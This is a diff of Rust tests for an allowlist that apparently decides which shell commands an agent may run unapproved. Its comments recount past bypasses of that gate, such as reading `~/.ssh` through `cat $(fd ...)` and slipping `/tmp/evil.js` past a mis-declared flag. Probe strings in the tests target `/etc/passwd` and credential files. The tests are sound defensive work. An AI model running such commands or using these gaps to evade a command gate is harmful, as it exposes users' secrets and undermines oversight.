-    /// A `nested_bare` sub must not accept an UNKNOWN nested subcommand.
-    ///
-    /// `max_positional` defaults to UNLIMITED, so a sub declaring only `nested_bare = true` takes
-    /// every following token as an unremarkable positional. Unknown FLAGS deny while unknown
-    /// POSITIONALS pass, so such an entry reads as "this subcommand is gated" while admitting
-    /// anything after it. `pulumi config` was exactly that: `pulumi config set k v` and
-    /// `pulumi config rm k` were approved — mutations of stack configuration, which is remote state
-    /// under the service backend — and only `--secret` refused, because it happened to be an
-    /// unlisted flag.
-    ///
-    /// Read from the TOML SOURCE rather than the lowered registry, because `nested_bare` is folded
-    /// into a dispatch kind and the property being guarded is a property of what was AUTHORED.
-    /// Enumerated so a future `nested_bare` sub with no nested subs fails here the day it lands.
-    #[test]
-    fn a_nested_bare_sub_refuses_an_unknown_nested_subcommand() {
-        fn tomls(dir: &std::path::Path, out: &mut Vec<std::path::PathBuf>) {
-            let Ok(entries) = std::fs::read_dir(dir) else { return };
-            for e in entries.flatten() {
-                let p = e.path();
-                if p.is_dir() {
-                    tomls(&p, out);
-                } else if p.extension().is_some_and(|x| x == "toml") {
-                    out.push(p);
-                }
+/// Data-defined spec: every TOML can declare `examples_safe` and
+/// `examples_denied` strings that exercise canonical and alias
+/// invocations. This test runs each through `is_safe_command` and
+/// flags any drift between the TOML and the runtime dispatcher.
+/// Use to lock in alias correctness, security boundaries, and
+/// representative agent invocations.
+/// A `nested_bare` sub must not accept an UNKNOWN nested subcommand.
+///
+/// `max_positional` defaults to UNLIMITED, so a sub declaring only `nested_bare = true` takes
+/// every following token as an unremarkable positional. Unknown FLAGS deny while unknown
+/// POSITIONALS pass, so such an entry reads as "this subcommand is gated" while admitting
+/// anything after it. `pulumi config` was exactly that: `pulumi config set k v` and
+/// `pulumi config rm k` were approved — mutations of stack configuration, which is remote state
+/// under the service backend — and only `--secret` refused, because it happened to be an
+/// unlisted flag.
+///
+/// Read from the TOML SOURCE rather than the lowered registry, because `nested_bare` is folded
+/// into a dispatch kind and the property being guarded is a property of what was AUTHORED.
+/// Enumerated so a future `nested_bare` sub with no nested subs fails here the day it lands.
+#[test]
+fn a_nested_bare_sub_refuses_an_unknown_nested_subcommand() {
+    fn tomls(dir: &std::path::Path, out: &mut Vec<std::path::PathBuf>) {
+        let Ok(entries) = std::fs::read_dir(dir) else { return };
+        for e in entries.flatten() {
+            let p = e.path();
+            if p.is_dir() {
+                tomls(&p, out);
+            } else if p.extension().is_some_and(|x| x == "toml") {
+                out.push(p);
             }
         }
-        let mut files = Vec::new();
-        tomls(std::path::Path::new("commands"), &mut files);
-        assert!(!files.is_empty(), "no command TOMLs found; the guard would be vacuous");
+    }
+    let mut files = Vec::new();
+    tomls(std::path::Path::new("commands"), &mut files);
+    assert!(!files.is_empty(), "no command TOMLs found; the guard would be vacuous");
 
-        let mut leaks = Vec::new();
-        let mut checked = 0usize;
-        for f in files {
-            let Ok(text) = std::fs::read_to_string(&f) else { continue };
-            let (mut command, mut sub, mut in_sub) = (String::new(), String::new(), false);
-            for line in text.lines() {
-                let t = line.trim();
-                if t == "[[command]]" {
-                    command.clear();
-                    in_sub = false;
-                } else if t == "[[command.sub]]" {
-                    sub.clear();
-                    in_sub = true;
-                } else if t.starts_with("[[") {
-                    in_sub = false;
-                } else if let Some(n) = t.strip_prefix("name = \"").and_then(|r| r.strip_suffix('"')) {
-                    if in_sub && sub.is_empty() {
-                        sub = n.to_string();
-                    } else if !in_sub && command.is_empty() {
-                        command = n.to_string();
-                    }
-                } else if t == "nested_bare = true" && in_sub && !command.is_empty() && !sub.is_empty() {
-                    checked += 1;
-                    for probe in [
-                        format!("{command} {sub} zzunknownsub"),
-                        format!("{command} {sub} zzunknownsub /etc/passwd"),
-                    ] {
-                        if crate::is_safe_command(&probe) {
-                            leaks.push(probe);
-                        }
+    let mut leaks = Vec::new();
+    let mut checked = 0usize;
+    for f in files {
+        let Ok(text) = std::fs::read_to_string(&f) else { continue };
+        let (mut command, mut sub, mut in_sub) = (String::new(), String::new(), false);
+        for line in text.lines() {
+            let t = line.trim();
+            if t == "[[command]]" {
+                command.clear();
+                in_sub = false;
+            } else if t == "[[command.sub]]" {
+                sub.clear();
+                in_sub = true;
+            } else if t.starts_with("[[") {
+                in_sub = false;
+            } else if let Some(n) = t.strip_prefix("name = \"").and_then(|r| r.strip_suffix('"')) {
+                if in_sub && sub.is_empty() {
+                    sub = n.to_string();
+                } else if !in_sub && command.is_empty() {
+                    command = n.to_string();
+                }
+            } else if t == "nested_bare = true" && in_sub && !command.is_empty() && !sub.is_empty() {
+                checked += 1;
+                for probe in [format!("{command} {sub} zzunknownsub"), format!("{command} {sub} zzunknownsub /etc/passwd")] {
+                    if crate::is_safe_command(&probe) {
+                        leaks.push(probe);
                     }
                 }
             }
         }
-        assert!(checked > 50, "only {checked} nested_bare subs seen; the walk is not finding them");
-        assert!(
-            leaks.is_empty(),
-            "a nested_bare sub admitted an unknown nested subcommand — unknown POSITIONALS pass \
+    }
+    assert!(checked > 50, "only {checked} nested_bare subs seen; the walk is not finding them");
+    assert!(
+        leaks.is_empty(),
+        "a nested_bare sub admitted an unknown nested subcommand — unknown POSITIONALS pass \
              where unknown flags deny, so the gate reads as closed while anything gets through:\n  {}",
-            leaks.join("\n  ")
-        );
-    }
+        leaks.join("\n  ")
+    );
+}
 
-    /// The command TREE must be well-formed: no name repeats at any level.
-    ///
-    /// This exists because a real corruption went undetected. An edit to `pulumi.toml` computed a
-    /// replacement region's end with an index that matched an EARLIER occurrence than intended, so
-    /// the slice duplicated a span instead of removing it — 12 `[[command.sub]]` blocks where there
-    /// should have been 10, and `history`/`tag`/`graph` reparented under `config`. The file remained
-    /// SYNTACTICALLY VALID TOML, so it parsed, the registry built, and the entire suite stayed
-    /// green. Every existing structural guard checks flag lists or examples; none checked the shape
-    /// of the tree.
-    ///
-    /// Uniqueness is the invariant that catches it: duplicating any span necessarily repeats a
-    /// name. Read from the TOML SOURCE rather than the lowered registry, because a duplicate may be
-    /// silently collapsed during lowering — the authored file is what went wrong and what a human
-    /// edits.
-    /// Collect every command TOML under `commands/`, excluding the SAMPLE reference file.
-    fn command_toml_files() -> Vec<std::path::PathBuf> {
-        fn tomls(dir: &std::path::Path, out: &mut Vec<std::path::PathBuf>) {
-            let Ok(entries) = std::fs::read_dir(dir) else { return };
-            for e in entries.flatten() {
-                let p = e.path();
-                if p.is_dir() {
-                    tomls(&p, out);
-                } else if p.extension().is_some_and(|x| x == "toml") {
-                    out.push(p);
-                }
+/// The command TREE must be well-formed: no name repeats at any level.
+///
+/// This exists because a real corruption went undetected. An edit to `pulumi.toml` computed a
+/// replacement region's end with an index that matched an EARLIER occurrence than intended, so
+/// the slice duplicated a span instead of removing it — 12 `[[command.sub]]` blocks where there
+/// should have been 10, and `history`/`tag`/`graph` reparented under `config`. The file remained
+/// SYNTACTICALLY VALID TOML, so it parsed, the registry built, and the entire suite stayed
+/// green. Every existing structural guard checks flag lists or examples; none checked the shape
+/// of the tree.
+///
+/// Uniqueness is the invariant that catches it: duplicating any span necessarily repeats a
+/// name. Read from the TOML SOURCE rather than the lowered registry, because a duplicate may be
+/// silently collapsed during lowering — the authored file is what went wrong and what a human
+/// edits.
+/// Collect every command TOML under `commands/`, excluding the SAMPLE reference file.
+fn command_toml_files() -> Vec<std::path::PathBuf> {
+    fn tomls(dir: &std::path::Path, out: &mut Vec<std::path::PathBuf>) {
+        let Ok(entries) = std::fs::read_dir(dir) else { return };
+        for e in entries.flatten() {
+            let p = e.path();
+            if p.is_dir() {
+                tomls(&p, out);
+            } else if p.extension().is_some_and(|x| x == "toml") {
+                out.push(p);
             }
         }
-        let mut files = Vec::new();
-        tomls(std::path::Path::new("commands"), &mut files);
-        files.retain(|f| !f.ends_with("SAMPLE.toml"));
-        files.sort();
-        files
     }
+    let mut files = Vec::new();
+    tomls(std::path::Path::new("commands"), &mut files);
+    files.retain(|f| !f.ends_with("SAMPLE.toml"));
+    files.sort();
+    files
+}
 
-    #[test]
-    fn the_command_tree_has_no_duplicate_names() {
-        let files = command_toml_files();
-        assert!(files.len() > 100, "only {} command TOMLs found; the walk is wrong", files.len());
+#[test]
+fn the_command_tree_has_no_duplicate_names() {
+    let files = command_toml_files();
+    assert!(files.len() > 100, "only {} command TOMLs found; the walk is wrong", files.len());
 
-        let mut problems = Vec::new();
-        let mut commands_seen: std::collections::HashMap<String, String> =
-            std::collections::HashMap::new();
-        let mut checked = 0usize;
+    let mut problems = Vec::new();
+    let mut commands_seen: std::collections::HashMap<String, String> = std::collections::HashMap::new();
+    let mut checked = 0usize;
 
-        for f in &files {
-            let Ok(text) = std::fs::read_to_string(f) else { continue };
-            let file = f.display().to_string();
-            let (mut cmd, mut sub) = (String::new(), String::new());
-            let mut level = 0u8; // 1 = command, 2 = sub, 3 = sub.sub
-            let mut subs: Vec<String> = Vec::new();
-            let mut subsubs: Vec<(String, String)> = Vec::new();
+    for f in &files {
+        let Ok(text) = std::fs::read_to_string(f) else { continue };
+        let file = f.display().to_string();
+        let (mut cmd, mut sub) = (String::new(), String::new());
+        let mut level = 0u8; // 1 = command, 2 = sub, 3 = sub.sub
+        let mut subs: Vec<String> = Vec::new();
+        let mut subsubs: Vec<(String, String)> = Vec::new();
 
-            let flush = |cmd: &str, subs: &mut Vec<String>, subsubs: &mut Vec<(String, String)>,
-                             problems: &mut Vec<String>| {
-                if cmd.is_empty() {
-                    return;
+        let flush = |cmd: &str, subs: &mut Vec<String>, subsubs: &mut Vec<(String, String)>, problems: &mut Vec<String>| {
+            if cmd.is_empty() {
+                return;
+            }
+            let mut seen = std::collections::HashSet::new();
+            for s in subs.iter() {
+                if !seen.insert(s.clone()) {
+                    problems.push(format!("{cmd}: subcommand `{s}` declared twice"));
                 }
-                let mut seen = std::collections::HashSet::new();
-                for s in subs.iter() {
-                    if !seen.insert(s.clone()) {
-                        problems.push(format!("{cmd}: subcommand `{s}` declared twice"));
-                    }
+            }
+            let mut seen2 = std::collections::HashSet::new();
+            for pair in subsubs.iter() {
+                if !seen2.insert(pair.clone()) {
+                    problems.push(format!("{cmd} {}: nested subcommand `{}` declared twice", pair.0, pair.1));
                 }
-                let mut seen2 = std::collections::HashSet::new();
-                for pair in subsubs.iter() {
-                    if !seen2.insert(pair.clone()) {
-                        problems.push(format!(
-                            "{cmd} {}: nested subcommand `{}` declared twice",
-                            pair.0, pair.1
-                        ));
-                    }
-                }
-                subs.clear();
-                subsubs.clear();
-            };
+            }
+            subs.clear();
+            subsubs.clear();
+        };
 
-            for line in text.lines() {
-                let t = line.trim();
-                match t {
-                    "[[command]]" => {
-                        flush(&cmd, &mut subs, &mut subsubs, &mut problems);
-                        cmd.clear();
-                        sub.clear();
-                        level = 1;
-                    }
-                    "[[command.sub]]" => {
-                        sub.clear();
-                        level = 2;
-                    }
-                    "[[command.sub.sub]]" => level = 3,
-                    _ if t.starts_with("[[") => level = 0,
-                    _ => {
-                        if let Some(n) =
-                            t.strip_prefix("name = \"").and_then(|r| r.strip_suffix('"'))
-                        {
-                            match level {
-                                1 if cmd.is_empty() => {
-                                    cmd = n.to_string();
-                                    checked += 1;
-                                    if let Some(prev) = commands_seen.insert(cmd.clone(), file.clone())
-                                        && prev != file
-                                    {
-                                        problems.push(format!(
-                                            "command `{cmd}` declared in both {prev} and {file}"
-                                        ));
-                                    }
+        for line in text.lines() {
+            let t = line.trim();
+            match t {
+                "[[command]]" => {
+                    flush(&cmd, &mut subs, &mut subsubs, &mut problems);
+                    cmd.clear();
+                    sub.clear();
+                    level = 1;
+                }
+                "[[command.sub]]" => {
+                    sub.clear();
+                    level = 2;
+                }
+                "[[command.sub.sub]]" => level = 3,
+                _ if t.starts_with("[[") => level = 0,
+                _ => {
+                    if let Some(n) = t.strip_prefix("name = \"").and_then(|r| r.strip_suffix('"')) {
+                        match level {
+                            1 if cmd.is_empty() => {
+                                cmd = n.to_string();
+                                checked += 1;
+                                if let Some(prev) = commands_seen.insert(cmd.clone(), file.clone())
+                                    && prev != file
+                                {
+                                    problems.push(format!("command `{cmd}` declared in both {prev} and {file}"));
                                 }
-                                2 if sub.is_empty() => {
-                                    sub = n.to_string();
-                                    subs.push(sub.clone());
-                                }
-                                3 => subsubs.push((sub.clone(), n.to_string())),
-                                _ => {}
                             }
+                            2 if sub.is_empty() => {
+                                sub = n.to_string();
+                                subs.push(sub.clone());
+                            }
+                            3 => subsubs.push((sub.clone(), n.to_string())),
+                            _ => {}
                         }
                     }
                 }
             }
-            flush(&cmd, &mut subs, &mut subsubs, &mut problems);
         }
-
-        assert!(checked > 100, "only {checked} commands scanned; the parse is wrong");
-
-        assert_tree_problems_are_known(&problems);
+        flush(&cmd, &mut subs, &mut subsubs, &mut problems);
     }
 
-    /// Compare the walk's findings against the acknowledged backlog, in both directions.
-    ///
-    /// Listing a row says "known, not yet triaged" — NOT that the shape is correct. The guard's job
-    /// is to block anything NOT listed, which is what a fresh corruption would be; and to fail when
-    /// a listed row stops reproducing, so the fixture cannot drift into describing a past that no
-    /// longer exists.
-    fn assert_tree_problems_are_known(problems: &[String]) {
-        let known: std::collections::HashSet<&str> =
-            include_str!("../../tests/fixtures/command_tree_duplicates.tsv")
-                .lines()
-                .map(str::trim)
-                .filter(|l| !l.is_empty() && !l.starts_with('#'))
-                .collect();
-        let fresh: Vec<&String> =
-            problems.iter().filter(|p| !known.contains(p.as_str())).collect();
-        assert!(
-            fresh.is_empty(),
-            "the command tree is malformed — a duplicated or reparented block still parses as \
+    assert!(checked > 100, "only {checked} commands scanned; the parse is wrong");
+
+    assert_tree_problems_are_known(&problems);
+}
+
+/// Compare the walk's findings against the acknowledged backlog, in both directions.
+///
+/// Listing a row says "known, not yet triaged" — NOT that the shape is correct. The guard's job
+/// is to block anything NOT listed, which is what a fresh corruption would be; and to fail when
+/// a listed row stops reproducing, so the fixture cannot drift into describing a past that no
+/// longer exists.
+fn assert_tree_problems_are_known(problems: &[String]) {
+    let known: std::collections::HashSet<&str> = include_str!("../../tests/fixtures/command_tree_duplicates.tsv")
+        .lines()
+        .map(str::trim)
+        .filter(|l| !l.is_empty() && !l.starts_with('#'))
+        .collect();
+    let fresh: Vec<&String> = problems.iter().filter(|p| !known.contains(p.as_str())).collect();
+    assert!(
+        fresh.is_empty(),
+        "the command tree is malformed — a duplicated or reparented block still parses as \
              valid TOML and builds cleanly, so nothing else catches this:\n  {}",
-            fresh.iter().map(|p| p.as_str()).collect::<Vec<_>>().join("\n  ")
-        );
-        // And the backlog must SHRINK, never silently grow stale: a row that no longer reproduces
-        // has been fixed and should be removed, or the fixture stops describing reality.
-        let stale: Vec<&str> =
-            known.iter().copied().filter(|k| !problems.iter().any(|p| p == k)).collect();
+        fresh.iter().map(|p| p.as_str()).collect::<Vec<_>>().join("\n  ")
+    );
+    // And the backlog must SHRINK, never silently grow stale: a row that no longer reproduces
+    // has been fixed and should be removed, or the fixture stops describing reality.
+    let stale: Vec<&str> = known.iter().copied().filter(|k| !problems.iter().any(|p| p == k)).collect();
+    assert!(stale.is_empty(), "these rows in command_tree_duplicates.tsv no longer reproduce — delete them:\n  {}", stale.join("\n  "));
+}
+
+/// A gated command must prove its SAFE form still works, by carrying an `examples_safe`.
+///
+/// The ratchet next door (`ambiguous_output_flags_do_not_write_sensitive_paths`) only looks for
+/// MISSING gates. It is blind to the opposite mistake, which is the one a burn-down actually
+/// makes: gating too broadly. `--output` is a path on `ytt` and a FORMAT on `bazel query`, so a
+/// well-meaning gate on the latter denies ordinary usage — and no test notices, because nothing
+/// asserts ordinary usage still passes.
+///
+/// `examples_safe` is the safe-twin control made permanent. Every gate added by hand this
+/// session was verified with one by hand (`clang-format -i ./src/x.c` still allows); this makes
+/// that verification a build artifact instead of a thing someone typed once, because
+/// `toml_examples_match_dispatch` re-runs those examples on every build.
+///
+/// A sub-scoped gate (`[roles."<cmd> <sub>"]`) must name EVERY spelling of that sub.
+///
+/// The key is matched against the literal token, so gating only the canonical name leaves each
+/// alias ungated — and the failure is invisible, because the canonical spelling denies exactly
+/// as intended. Measured with a gate on `swiftlint fix`:
+/// `swiftlint fix ~/.ssh/authorized_keys` denied while `swiftlint autocorrect …` was ALLOWED.
+/// 35 subs in the registry declare aliases, so this is a trap laid for the next author, not a
+/// one-off.
+///
+/// Resolving aliases inside `should_deny` would be the deeper fix; it needs a sub-name
+/// canonicalizer the pathgate layer does not have. Until then this fails the build rather than
+/// letting a half-covered gate look complete.
+/// `optional_valued` must be the ONLY place a flag is declared.
+///
+/// The field compiles down to membership in both other lists, so listing a flag in
+/// `optional_valued` AND in `standalone` or `valued` produces exactly the state that was
+/// indistinguishable before — and re-creates the ambiguity the field exists to remove. The
+/// duplicate is silent otherwise: the built policy is identical either way, so nothing would
+/// ever surface it.
+///
+/// This is deliberately NOT a guard against a raw `standalone`+`valued` overlap. Those scopes
+/// still exist and are not all errors; sorting them is the migration this field unblocks, and
+/// a guard written before that would encode a convention nobody has chosen (TODO.md).
+/// A File executor is governed by its own flag grammar unless it declares `passes_argv`.
+///
+/// `dispatch_executor` used to return the locus verdict INSTEAD of checking the policy, so
+/// `max_positional` went unenforced the moment a first positional resolved. A command that
+/// OPENS its extra positionals was then handed them: `karma start ./ok.conf.js
+/// /etc/evil.conf.js` was admitted, the second path being a second config karma loads and
+/// runs. Both it and `tilt` grew a `path_gate` to compensate, which worked, and left the
+/// grammar itself unenforced for whatever declared an executor next.
+///
+/// The distinction cannot be inferred, which is why it is declared: an interpreter's trailing
+/// tokens are the SCRIPT's argv and no flag list here can describe them, while a tool that
+/// merely takes a config path has no argv to pass. Defaulting to false makes the enforcing
+/// answer the one a new entry gets without thinking about it.
+#[test]
+fn a_file_executor_enforces_its_grammar_unless_it_passes_argv() {
+    // Declares `passes_argv`: trailing tokens belong to the script, so they are not counted.
+    assert!(crate::is_safe_command("python3 ./task.py --flag arg"), "argv passes through");
+    assert!(crate::is_safe_command("python3 ./task.py a b c"), "several argv words");
+    assert!(crate::is_safe_command("ruby ./rakefile.rb x y"));
+    assert!(crate::is_safe_command("go run ./cmd/app a b"));
+    // The executor itself is still locus-gated — passing argv is not passing anything else.
+    assert!(!crate::is_safe_command("python3 /tmp/evil.py"), "a foreign script still denies");
+
+    // Does NOT declare it: `max_positional = 1` governs, so a second config is refused. karma
+    // also carries a path_gate today; this holds without one, which is the point — measured by
+    // commenting the gate out, where the deny survives.
+    assert!(!crate::is_safe_command("karma start ./ok.conf.js /etc/evil.conf.js"), "a second config file is a second thing karma executes");
+    assert!(crate::is_safe_command("karma start ./ok.conf.js"), "one config is the ordinary use");
+}
+
+/// Every `[command.output]` variant must have confronted the rule that a locus-only claim
+/// cannot clear a NAME-based shield.
+///
+/// `resolve.rs` drops an `Operands` claim once the worst root is `>= user`, because at that
+/// point the claim carries a LOCATION and the credential shield needs a FILENAME — the two
+/// stop being the same question. `cat $(fd pat ~/.ssh)` was allowed while `cat ~/.ssh/id_rsa`
+/// denied, until that check was added.
+///
+/// The risk this guard exists for is a FUTURE variant that quietly skips it. TODO.md carried a
+/// proposal for exactly one — "a PATH-resolved executable, locus machine", to make
+/// `$(which bundle)` pinnable — which is `>= user` by construction and would have reintroduced
+/// the same fail-open. `no_abstraction_is_more_permissive_than_a_path_it_could_denote` would
+/// catch it, but only for the shapes its ABSTRACTION_SITES actually build, and that list is
+/// hardcoded to `fd`; a claim added to `which` would not be exercised by it at all.
+///
+/// So this matches exhaustively rather than testing behaviour: adding a variant fails to
+/// compile here, and the author has to say which side of the `user` line it falls on.
+#[test]
+fn every_output_locus_variant_states_whether_it_can_exceed_the_user_rung() {
+    use super::types::OutputLocus;
+
+    for variant in [OutputLocus::Operands, OutputLocus::Cwd, OutputLocus::Stdin, OutputLocus::Atom] {
+        let bounded_below_user = match variant {
+            // Bounded by its own operands' worst read locus, and explicitly dropped at
+            // `>= user` in `resolve_output_claim`.
+            OutputLocus::Operands => true,
+            // The cwd is the workspace root by construction, so worktree.
+            OutputLocus::Cwd => true,
+            // Carries the previous pipeline stage's locus, which is bounded by the same rules.
+            OutputLocus::Stdin => true,
+            // Names no locus at all — a separator-free word cannot move which directory a
+            // path denotes, so there is nothing here to exceed.
+            OutputLocus::Atom => true,
+        };
         assert!(
-            stale.is_empty(),
-            "these rows in command_tree_duplicates.tsv no longer reproduce — delete them:\n  {}",
-            stale.join("\n  ")
-        );
-    }
-
-    /// A gated command must prove its SAFE form still works, by carrying an `examples_safe`.
-    ///
-    /// The ratchet next door (`ambiguous_output_flags_do_not_write_sensitive_paths`) only looks for
-    /// MISSING gates. It is blind to the opposite mistake, which is the one a burn-down actually
-    /// makes: gating too broadly. `--output` is a path on `ytt` and a FORMAT on `bazel query`, so a
-    /// well-meaning gate on the latter denies ordinary usage — and no test notices, because nothing
-    /// asserts ordinary usage still passes.
-    ///
-    /// `examples_safe` is the safe-twin control made permanent. Every gate added by hand this
-    /// session was verified with one by hand (`clang-format -i ./src/x.c` still allows); this makes
-    /// that verification a build artifact instead of a thing someone typed once, because
-    /// `toml_examples_match_dispatch` re-runs those examples on every build.
-    ///
-    /// A sub-scoped gate (`[roles."<cmd> <sub>"]`) must name EVERY spelling of that sub.
-    ///
-    /// The key is matched against the literal token, so gating only the canonical name leaves each
-    /// alias ungated — and the failure is invisible, because the canonical spelling denies exactly
-    /// as intended. Measured with a gate on `swiftlint fix`:
-    /// `swiftlint fix ~/.ssh/authorized_keys` denied while `swiftlint autocorrect …` was ALLOWED.
-    /// 35 subs in the registry declare aliases, so this is a trap laid for the next author, not a
-    /// one-off.
-    ///
-    /// Resolving aliases inside `should_deny` would be the deeper fix; it needs a sub-name
-    /// canonicalizer the pathgate layer does not have. Until then this fails the build rather than
-    /// letting a half-covered gate look complete.
-    /// `optional_valued` must be the ONLY place a flag is declared.
-    ///
-    /// The field compiles down to membership in both other lists, so listing a flag in
-    /// `optional_valued` AND in `standalone` or `valued` produces exactly the state that was
-    /// indistinguishable before — and re-creates the ambiguity the field exists to remove. The
-    /// duplicate is silent otherwise: the built policy is identical either way, so nothing would
-    /// ever surface it.
-    ///
-    /// This is deliberately NOT a guard against a raw `standalone`+`valued` overlap. Those scopes
-    /// still exist and are not all errors; sorting them is the migration this field unblocks, and
-    /// a guard written before that would encode a convention nobody has chosen (TODO.md).
-    /// A File executor is governed by its own flag grammar unless it declares `passes_argv`.
-    ///
-    /// `dispatch_executor` used to return the locus verdict INSTEAD of checking the policy, so
-    /// `max_positional` went unenforced the moment a first positional resolved. A command that
-    /// OPENS its extra positionals was then handed them: `karma start ./ok.conf.js
-    /// /etc/evil.conf.js` was admitted, the second path being a second config karma loads and
-    /// runs. Both it and `tilt` grew a `path_gate` to compensate, which worked, and left the
-    /// grammar itself unenforced for whatever declared an executor next.
-    ///
-    /// The distinction cannot be inferred, which is why it is declared: an interpreter's trailing
-    /// tokens are the SCRIPT's argv and no flag list here can describe them, while a tool that
-    /// merely takes a config path has no argv to pass. Defaulting to false makes the enforcing
-    /// answer the one a new entry gets without thinking about it.
-    #[test]
-    fn a_file_executor_enforces_its_grammar_unless_it_passes_argv() {
-        // Declares `passes_argv`: trailing tokens belong to the script, so they are not counted.
-        assert!(crate::is_safe_command("python3 ./task.py --flag arg"), "argv passes through");
-        assert!(crate::is_safe_command("python3 ./task.py a b c"), "several argv words");
-        assert!(crate::is_safe_command("ruby ./rakefile.rb x y"));
-        assert!(crate::is_safe_command("go run ./cmd/app a b"));
-        // The executor itself is still locus-gated — passing argv is not passing anything else.
-        assert!(!crate::is_safe_command("python3 /tmp/evil.py"), "a foreign script still denies");
-
-        // Does NOT declare it: `max_positional = 1` governs, so a second config is refused. karma
-        // also carries a path_gate today; this holds without one, which is the point — measured by
-        // commenting the gate out, where the deny survives.
-        assert!(
-            !crate::is_safe_command("karma start ./ok.conf.js /etc/evil.conf.js"),
-            "a second config file is a second thing karma executes"
-        );
-        assert!(crate::is_safe_command("karma start ./ok.conf.js"), "one config is the ordinary use");
-    }
-
-    /// Every `[command.output]` variant must have confronted the rule that a locus-only claim
-    /// cannot clear a NAME-based shield.
-    ///
-    /// `resolve.rs` drops an `Operands` claim once the worst root is `>= user`, because at that
-    /// point the claim carries a LOCATION and the credential shield needs a FILENAME — the two
-    /// stop being the same question. `cat $(fd pat ~/.ssh)` was allowed while `cat ~/.ssh/id_rsa`
-    /// denied, until that check was added.
-    ///
-    /// The risk this guard exists for is a FUTURE variant that quietly skips it. TODO.md carried a
-    /// proposal for exactly one — "a PATH-resolved executable, locus machine", to make
-    /// `$(which bundle)` pinnable — which is `>= user` by construction and would have reintroduced
-    /// the same fail-open. `no_abstraction_is_more_permissive_than_a_path_it_could_denote` would
-    /// catch it, but only for the shapes its ABSTRACTION_SITES actually build, and that list is
-    /// hardcoded to `fd`; a claim added to `which` would not be exercised by it at all.
-    ///
-    /// So this matches exhaustively rather than testing behaviour: adding a variant fails to
-    /// compile here, and the author has to say which side of the `user` line it falls on.
-    #[test]
-    fn every_output_locus_variant_states_whether_it_can_exceed_the_user_rung() {
-        use super::types::OutputLocus;
-
-        for variant in [
-            OutputLocus::Operands,
-            OutputLocus::Cwd,
-            OutputLocus::Stdin,
-            OutputLocus::Atom,
-        ] {
-            let bounded_below_user = match variant {
-                // Bounded by its own operands' worst read locus, and explicitly dropped at
-                // `>= user` in `resolve_output_claim`.
-                OutputLocus::Operands => true,
-                // The cwd is the workspace root by construction, so worktree.
-                OutputLocus::Cwd => true,
-                // Carries the previous pipeline stage's locus, which is bounded by the same rules.
-                OutputLocus::Stdin => true,
-                // Names no locus at all — a separator-free word cannot move which directory a
-                // path denotes, so there is nothing here to exceed.
-                OutputLocus::Atom => true,
-            };
-            assert!(
-                bounded_below_user,
-                "{variant:?} can denote a path at or above `user`. A claim that carries only a \
+            bounded_below_user,
+            "{variant:?} can denote a path at or above `user`. A claim that carries only a \
                  LOCATION cannot clear the credential shield, which matches on the NAME — so this \
                  variant must either be dropped at `>= user` the way `Operands` is, or not exist. \
                  See TODO.md, \"That variant CANNOT be built\"."
-            );
+        );
+    }
+}
+
+/// A long flag declared `standalone` here while declared `valued` in many other scopes.
+///
+/// The bug this hunts does not look like a bug. A flag in the wrong list reads as completely
+/// normal, and nothing compares a declaration against the tool's real grammar — but the value
+/// it should have consumed falls through as a POSITIONAL, and any gate on that flag then never
+/// fires. `webpack -c /tmp/evil.js` auto-approved for exactly this reason. That makes it a
+/// meta-bug: it does not add one hole, it disables a defence wherever it occurs.
+///
+/// `a_gated_flag_is_never_declared_value_less` already covers the flags that carry a gate.
+/// This is the UNGATED remainder, where the mistake is otherwise invisible, and it is answered
+/// from the corpus alone: a `--name` means roughly the same thing across tools, so a flag
+/// valued in many scopes and standalone in one or two is evidence about the one or two.
+///
+/// SHORT flags are excluded deliberately. `-o` is an output path in one tool and a boolean in
+/// the next, so the cross-tool comparison carries no information there — and they are most of
+/// the raw overlap (`-r` in 34 scopes, `-c` in 26), so including them would bury the signal in
+/// noise rather than adding to it.
+///
+/// The threshold is evidence, not proof, so the fixture is a WORKLIST rather than a deny-list:
+/// a row means "check this one tool", and some rows will turn out correct as written.
+#[test]
+fn a_long_flag_is_not_standalone_where_it_is_valued_elsewhere() {
+    use super::types::TomlFile;
+    use std::collections::{HashMap, HashSet};
+
+    fn toml_files(dir: &std::path::Path, out: &mut Vec<std::path::PathBuf>) {
+        for e in std::fs::read_dir(dir).expect("read commands dir") {
+            let p = e.expect("dir entry").path();
+            if p.is_dir() {
+                toml_files(&p, out);
+            } else if p.extension().is_some_and(|x| x == "toml") {
+                out.push(p);
+            }
         }
     }
 
-    /// A long flag declared `standalone` here while declared `valued` in many other scopes.
-    ///
-    /// The bug this hunts does not look like a bug. A flag in the wrong list reads as completely
-    /// normal, and nothing compares a declaration against the tool's real grammar — but the value
-    /// it should have consumed falls through as a POSITIONAL, and any gate on that flag then never
-    /// fires. `webpack -c /tmp/evil.js` auto-approved for exactly this reason. That makes it a
-    /// meta-bug: it does not add one hole, it disables a defence wherever it occurs.
-    ///
-    /// `a_gated_flag_is_never_declared_value_less` already covers the flags that carry a gate.
-    /// This is the UNGATED remainder, where the mistake is otherwise invisible, and it is answered
-    /// from the corpus alone: a `--name` means roughly the same thing across tools, so a flag
-    /// valued in many scopes and standalone in one or two is evidence about the one or two.
-    ///
-    /// SHORT flags are excluded deliberately. `-o` is an output path in one tool and a boolean in
-    /// the next, so the cross-tool comparison carries no information there — and they are most of
-    /// the raw overlap (`-r` in 34 scopes, `-c` in 26), so including them would bury the signal in
-    /// noise rather than adding to it.
-    ///
-    /// The threshold is evidence, not proof, so the fixture is a WORKLIST rather than a deny-list:
-    /// a row means "check this one tool", and some rows will turn out correct as written.
-    #[test]
-    fn a_long_flag_is_not_standalone_where_it_is_valued_elsewhere() {
-        use super::types::TomlFile;
-        use std::collections::{HashMap, HashSet};
+    let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("commands");
+    let mut files = Vec::new();
+    toml_files(&root, &mut files);
 
-        fn toml_files(dir: &std::path::Path, out: &mut Vec<std::path::PathBuf>) {
-            for e in std::fs::read_dir(dir).expect("read commands dir") {
-                let p = e.expect("dir entry").path();
-                if p.is_dir() {
-                    toml_files(&p, out);
-                } else if p.extension().is_some_and(|x| x == "toml") {
-                    out.push(p);
-                }
+    // flag -> (scopes declaring it standalone, count of scopes declaring it valued)
+    let mut standalone_scopes: HashMap<String, Vec<String>> = HashMap::new();
+    let mut valued_count: HashMap<String, usize> = HashMap::new();
+    for file in &files {
+        let src = std::fs::read_to_string(file).expect("read toml");
+        let parsed: TomlFile = toml::from_str(&src).expect("parse toml");
+        for cmd in &parsed.command {
